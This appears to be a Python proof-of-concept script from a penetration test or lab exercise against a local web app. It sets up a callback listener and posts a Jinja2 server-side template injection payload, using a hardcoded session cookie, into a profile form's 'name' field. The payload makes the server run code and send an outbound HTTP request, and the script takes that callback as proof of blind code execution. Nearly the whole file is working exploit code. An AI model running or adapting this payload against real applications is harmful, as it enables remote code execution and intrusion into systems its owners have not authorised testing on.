import http.server
import threading
import time
import requests
import socket

# Global variable to track if callback was received
callback_received = False

class CallbackHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global callback_received
        callback_received = True
        print(f"[!] CALLBACK RECEIVED: {self.path}")
        print(f"[+] Headers: {dict(self.headers)}")
        self.send_response(200)
        self.end_headers()
        
    def log_message(self, format, *args):
        pass  # Suppress default logging

# Check if port 8888 is available
def is_port_available(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('localhost', port)) != 0

# Function to start HTTP server
def start_server():
    if not is_port_available(8888):
        print("[!] Port 8888 is already in use, checking if callback was received")
        return None
    
    server = http.server.HTTPServer(('localhost', 8888), CallbackHandler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()
    print("[+] HTTP server started on port 8888, listening for callbacks...")
    return server

# Start the server
print("=" * 60)
print("BLIND SSTI OUTBOUND REQUEST TEST")
print("=" * 60)
server = start_server()

# Wait a moment for server to start
time.sleep(1)

# Session cookie from context
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVqK6Q.DjdnJP5cp110FpB2UDxmK976cZA"

cookies = {
    'session': session_cookie
}

# Jinja2/SSTI payload that makes outbound HTTP request
# This uses urllib.request.urlopen() to call our callback server
ssti_payload = "{{ __import__('urllib.request').urlopen('http://localhost:8888/callback?test=success').read() }}"

print(f"\n[+] Using SSTI payload: {ssti_payload}")
print("[+] Sending SSTI payload to /profile endpoint via POST...")

# POST data with payload injected into 'name' field
data = {
    'name': ssti_payload,
    'email': 'test@example.com',
    'phone': '123-456-7890',
    'address': '123 Test St',
    'city': 'Test City',
    'country': 'Test Country'
}

try:
    response = requests.post(
        'http://127.0.0.1:32813/profile',
        cookies=cookies,
        data=data,
        allow_redirects=False
    )
    
    print(f"[+] POST request sent to /profile")
    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response length: {len(response.text)} bytes")
    
    # Wait for callback
    print("\n[+] Waiting 5 seconds for potential callback...")
    time.sleep(5)
    
except Exception as e:
    print(f"[!] Error sending request: {e}")

# Check if callback was received
print("\n" + "=" * 60)
print("RESULTS")
print("=" * 60)
if callback_received:
    print("[!] CALLBACK RECEIVED - PROOF OF BLIND SSTI!")
    print("[+] The template engine executed code and made outbound HTTP request")
    print("[+] This confirms the application is vulnerable to blind SSTI")
